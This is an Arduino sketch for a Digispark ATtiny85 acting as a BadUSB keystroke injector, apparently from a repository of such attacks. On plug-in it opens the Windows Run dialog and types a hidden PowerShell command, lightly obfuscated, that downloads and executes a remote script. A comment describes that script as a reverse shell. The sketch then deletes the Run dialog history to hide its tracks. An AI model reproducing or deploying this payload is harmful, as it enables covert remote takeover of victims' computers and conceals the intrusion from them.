#include "DigiKeyboard.h"

void setup() {
  // put your code here, to run once:

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // download + start reverse shell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sajithgairuka/Attiny85-Attcks/main/pd.txt');\"");
  DigiKeyboard.delay(9000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT );
  DigiKeyboard.sendKeyStroke(KEY_ENTER );
  DigiKeyboard.delay(5000);

  // clean up the run dialog history
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""); 
}

void loop() {
  // put your code here, to run repeatedly:
}
